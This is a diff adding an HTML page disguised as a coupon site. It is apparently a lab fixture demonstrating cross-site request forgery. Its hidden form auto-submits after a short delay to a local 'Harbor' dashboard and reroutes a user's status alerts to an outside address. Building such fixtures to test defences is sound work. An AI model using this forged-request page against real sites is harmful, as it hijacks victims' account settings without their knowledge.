@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<link rel="icon" href="data:,">
+<title>Free shipping coupons</title>
+<style>
+body { font: 18px/1.5 system-ui, sans-serif; background: #fff8e7; color: #2b2118; max-width: 40rem; margin: 3rem auto; padding: 0 1rem; }
+h1 { color: #b4441a; }
+</style>
+</head>
+<body>
+<h1>Free shipping coupons</h1>
+<p>Loading your coupon...</p>
+<!-- Lab only: this page is another website. Its hidden form makes Maya's browser send Harbor's dashboard a request
+     that changes where her status alerts go: a change Maya herself is allowed to make, made here in her name. -->
+<form id="forged" method="post" action="http://dashboard.harbor.localhost:{{env "HARBOR_PORT"}}/alerts">
+  <input type="hidden" name="alerts_to" value="deals@coupons.example">
+</form>
+<script>setTimeout(() => document.getElementById("forged").submit(), 800)</script>
+</body>
+</html>
